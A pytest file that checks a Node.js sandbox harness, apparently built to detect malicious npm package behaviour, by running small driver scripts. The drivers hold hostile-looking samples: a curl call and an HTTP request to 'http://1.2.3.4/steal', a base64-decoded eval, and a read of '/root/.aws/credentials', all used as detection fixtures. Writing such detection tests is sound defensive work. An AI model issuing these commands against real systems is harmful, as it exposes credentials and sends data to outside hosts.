import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

HARNESS = Path("src/npm_ide_analyst/sandbox/harness")
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def _run_driver(tmp_path: Path, driver_src: str) -> list[dict]:
    driver = tmp_path / "driver.js"
    driver.write_text(driver_src, encoding="utf-8")
    log = tmp_path / "events.jsonl"
    preload = (HARNESS / "preload.js").resolve()
    env = {**os.environ, "ANALYST_EVENT_LOG": str(log)}
    subprocess.run(["node", "-r", str(preload), str(driver)],
                   env=env, timeout=30, capture_output=True)
    if not log.exists():
        return []
    return [json.loads(line) for line in log.read_text().splitlines() if line.strip()]


def test_hooks_process_exec(tmp_path):
    events = _run_driver(tmp_path,
        "const cp=require('child_process'); cp.exec('curl http://1.2.3.4/x', ()=>{});")
    assert any(e["kind"] == "process" and "curl" in e["detail"] for e in events)


def test_hooks_network_captures_url(tmp_path):
    events = _run_driver(tmp_path,
        "require('http').request('http://1.2.3.4/steal', ()=>{}).end();")
    assert any(e["kind"] == "network" and "1.2.3.4" in e["detail"] for e in events)


def test_hooks_eval_logs_decoded_code(tmp_path):
    import base64
    # Decoded code must (a) trip the decode hook's malware-keyword filter
    # (contains "require"/"http") and (b) eval cleanly in global scope
    # (indirect eval has no local `require`), so use a keyword-bearing comment.
    code = "1 /* require http */"
    b64 = base64.b64encode(code.encode()).decode()
    events = _run_driver(tmp_path,
        f"eval(Buffer.from('{b64}','base64').toString());")
    assert any(e["kind"] == "decode" for e in events)
    assert any(e["kind"] == "eval" for e in events)


def test_hooks_sensitive_file_read(tmp_path):
    events = _run_driver(tmp_path,
        "try{require('fs').readFileSync('/root/.aws/credentials')}catch(e){}")
    assert any(e["kind"] in ("file", "secret") and "credentials" in e["detail"]
               for e in events)
